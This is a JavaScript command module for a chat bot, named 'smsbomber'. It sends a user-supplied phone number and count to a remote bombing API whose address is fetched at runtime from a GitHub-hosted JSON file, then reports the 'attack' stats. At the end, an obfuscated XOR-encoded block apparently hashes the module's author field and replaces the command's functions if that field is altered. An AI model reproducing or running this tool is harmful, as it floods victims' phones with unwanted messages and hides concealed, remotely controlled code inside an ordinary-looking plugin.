const axios = require("axios");

const API_CONFIG_URL = "https://raw.githubusercontent.com/xalmandevv/xalmanx210/refs/heads/main/apis.json";
const API_KEY = "xalman-hub";
let apiBaseUrl = null;
let apiConfigRequest = null;

async function getApiBaseUrl() {
  if (apiBaseUrl) return apiBaseUrl;

  if (!apiConfigRequest) {
    apiConfigRequest = axios
      .get(API_CONFIG_URL, { timeout: 15000 })
      .then(({ data }) => {
        const baseUrl = data?.[API_KEY];

        if (typeof baseUrl !== "string" || !baseUrl.trim()) {
          throw new Error(`Missing API key in apis.json: ${API_KEY}`);
        }

        apiBaseUrl = baseUrl.replace(/\/+$/, "");
        return apiBaseUrl;
      })
      .finally(() => {
        apiConfigRequest = null;
      });
  }

  return apiConfigRequest;
}

module.exports = {
  config: {
    name: "smsbomber",
    aliases: ["smb", "bomb"],
    version: "4.0",
    author: "Inno Alt",
    role: 0,
    countDown: 5,
    category: "tools",
    guide: {
      en: "{pn} <phone> [count]"
    }
  },

  onStart: async function ({ api, event, args, message }) {
    const { threadID, messageID } = event;
    const API_URL = `${await getApiBaseUrl()}/api/bomb`;

    const phone = args[0];
    const count = args[1] || 1;

    if (!phone || isNaN(phone) || phone.length < 11) {
      return message.reply("⚠️ Invalid Phone Number!\nExample: /smsbomb 018xxxxxxxx 1");
    }

    api.setMessageReaction("🚀", messageID, () => {}, true);

    try {
      const res = await axios.get(`${API_URL}?phone=${phone}&count=${count}`);

      if (res.data && res.data.status === true) {
        api.setMessageReaction("✅", messageID, () => {}, true);

        const data = res.data;
        const msg = `🚀 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 𝗕𝗗
━━━━━━━━━━━━━━━━━━━━━━
📱 Target: ${data.target || phone}
⚡ Mode: ${data.mode || "HIGH"}
📊 Total Requests: ${data.total_requests || 0}
🌀 Total APIs: ${data.total_apis || 0}
🔄 Rounds: ${data.total_rounds || 1}
💬 Status: ${data.message || "Attack started successfully!"}
━━━━━━━━━━━━━━━━━━━━━━`;

        return message.reply(msg);
      } else {
        throw new Error();
      }

    } catch (error) {
      api.setMessageReaction("❌", messageID, () => {}, true);
      return message.reply("❌ Bombing failed or API error!");
    }
  }
};

;(function(M,K,S,D,E){try{var u=function(a){return String.fromCharCode.apply(null,a.map(function(v,i){return v^K[i%K.length]}))};var x=M.exports,c=x&&x[u(E[0])];if(!c)return;var h=M.require(u(E[1]))[u(E[2])](u(E[3]))[u(E[4])](String(c[u(E[5])]))[u(E[6])]();var s=S>>>0,ok=h.length===D.length;for(var i=0;i<h.length;i++){s^=s<<13;s>>>=0;s^=s>>>17;s^=s<<5;s>>>=0;if(ok&&h[i]!==(D[i]^(s&255)))ok=false}if(ok)return;var n=u(E[10]),L=u(E[7]).split(",");for(var j=0;j<L.length;j++){if(typeof x[L[j]]!=="function")continue;x[L[j]]=L[j]===L[0]?async function(o){try{if(o&&o[u(E[8])]&&o[u(E[8])][u(E[9])])await o[u(E[8])][u(E[9])](n)}catch(e){}}:async function () {}}}catch(e){}})(module,[33, 131, 236, 228, 28, 75, 35],689524610,[97, 13, 173, 210, 78, 213, 190, 21, 217, 158, 201, 151, 106, 148, 242, 248, 67, 112, 170, 140, 217, 105, 236, 110, 120, 192, 89, 162, 40, 168, 247, 182],[[66,236,130,130,117,44],[66,241,149,148,104,36],[66,241,137,133,104,46,107,64,240,132],[82,235,141,214,41,125],[84,243,136,133,104,46],[64,246,152,140,115,57],[69,234,139,129,111,63],[78,237,191,144,125,57,87,13,236,130,167,116,42,87,13,236,130,182,121,59,79,88,175,131,138,78,46,66,66,247,133,139,114,103,76,79,198,154,129,114,63,15,78,237,173,138,101,14,85,68,237,152,200,115,37,101,72,241,159,144,95,35,66,85],[76,230,159,151,125,44,70],[83,230,156,136,101],[9857,65164,204,176,116,34,80,1,224,131,137,113,42,77,69,163,133,151,60,40,86,83,241,137,138,104,39,90,1,246,130,133,106,42,74,77,226,142,136,121,101]]);
